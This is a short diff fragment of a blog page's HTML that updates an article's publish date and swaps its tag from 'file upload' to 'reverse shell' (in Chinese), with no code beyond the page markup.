                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-20
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-14
                             </span>
                         <span class="publish-author">
                             
@@ -897,8 +873,8 @@ if ($row) {
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/文件上传/" target="_blank">
-                        <span class="chip bg-color">文件上传</span>
+                    <a href="/tags/反弹shell/" target="_blank">
+                        <span class="chip bg-color">反弹shell</span>
                     </a>
                     
                 </div>
